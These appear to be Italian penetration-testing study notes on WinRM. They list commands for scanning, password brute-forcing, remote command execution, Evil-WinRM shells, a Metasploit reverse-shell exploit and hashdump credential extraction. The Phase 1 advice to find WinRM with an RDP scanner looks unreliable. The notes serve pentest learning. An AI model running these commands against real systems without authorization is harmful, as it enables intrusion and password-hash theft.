<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# WinRM Enumeration & Exploitation

**WinRM (Windows Remote Management)** è un protocollo Microsoft che consente l’amministrazione remota di macchine Windows tramite PowerShell. Utilizza le porte `5985/TCP` (HTTP) e `5986/TCP` (HTTPS), e viene ampiamente usato in ambienti Active Directory per la gestione centralizzata dei sistemi. Quando mal configurato o esposto, può rappresentare un punto d’accesso critico.

---

## Fase 1 – Scansione del Servizio WinRM

La scansione standard di Nmap (`nmap -sS <IP>`) **non include automaticamente le porte 5985 e 5986**, quindi è fondamentale specificarle manualmente:

`nmap -p 5985,5986 -sV <IP>` ⟶ verifica se WinRM è attivo e restituisce banner, certificati e dettagli del server.  

Per uno script specifico:
`nmap -p 5985 --script http-winrm-info <IP>`

Con Metasploit:
`use auxiliary/scanner/winrm/winrm_auth_methods`<br>
`set RHOSTS <IP>`<br>
`run`<br>

Questo modulo consente di determinare i metodi di autenticazione supportati (NTLM, Basic, Kerberos).

WinRM può anche essere attivo su porte non standard. Per rilevarlo:

`use auxiliary/scanner/rdp/rdp_scanner`<br>
`set RHOSTS <IP>`<br>
`set RPORT <porta_sospetta>`<br>
`run`<br>

---

## Fase 2 – Brute-force delle Credenziali

### CrackMapExec

CrackMapExec è uno strumento multiuso per testare l’autenticazione nei servizi Windows. 

Per vedere le opzioni disponibili:
`crackmapexec -h`

Attacco bruteforce su WinRM:
`crackmapexec winrm <IP> -u <username> -p <lista_password>`  
Oppure per test singolo:
`crackmapexec winrm <IP> -u administrator -p Password123`

### Metasploit

In alternativa, puoi usare Metasploit:
`use auxiliary/scanner/winrm/winrm_login`<br>
`set RHOSTS <IP>`<br>
`set USER_FILE <lista_utenti>`<br>
`set PASS_FILE <lista_password>`<br>
`set PASSWORD anything`<br>
`run`<br>

Il campo `PASSWORD` deve sempre essere valorizzato anche se stai usando un dizionario, altrimenti il modulo non eseguirà il test.

---

## Fase 3 – Esecuzione Remota di Comandi

### Con CrackMapExec:

`crackmapexec winrm <IP> -u <username> -p <password> -x "whoami"`<br>
Permette di eseguire comandi come `whoami`, `hostname`, `systeminfo`, ecc.

### Con Metasploit:

`use auxiliary/scanner/winrm/winrm_cmd`<br>
`set RHOSTS <IP>`<br>
`set USERNAME <utente>`<br>
`set PASSWORD <password>`<br>
`set CMD "whoami"`<br>
`run`<br>

Questo modulo è utile per:
- Verificare se le credenziali funzionano
- Eseguire comandi diagnostici
- Operare in ambienti con logging avanzato
- Testare permessi utente

---

## Fase 4 – Accesso Interattivo

### Evil-WinRM

Strumento Ruby per accedere a una shell PowerShell remota:

`evil-winrm -u <username> -p '<password>' -i <IP>`<br>

Funzionalità disponibili:
- Shell interattiva
- Upload e download file
- Esecuzione script PowerShell
- Post-exploitation tools

---

## Fase 5 – Exploit con Metasploit

Per ottenere una shell Meterpreter:

`use exploit/windows/winrm/winrm_script_exec`<br>
`set RHOSTS <IP>`<br>
`set LHOST <tuo_IP>`<br>
`set LPORT <Port>`<br>
`set USERNAME <utente>`<br>
`set PASSWORD <password>`<br>
`set FORCE_VBS true`<br>
`run`<br>

L’opzione `FORCE_VBS` forza l’esecuzione tramite VBScript e aumenta la compatibilità su sistemi con policy restrittive.

---

## Fase 6 – Post-Sfruttamento

Una volta ottenuto accesso tramite Meterpreter:
- `getuid` ⟶ mostra l’identità dell’utente corrente<br>
- `getprivs` ⟶ elenca i privilegi<br>
- `hashdump` ⟶ estrae hash delle password (se permesso)<br>
- `sysinfo` ⟶ mostra dettagli del sistema<br>
- `shell` ⟶ apre un prompt interattivo<br>

---
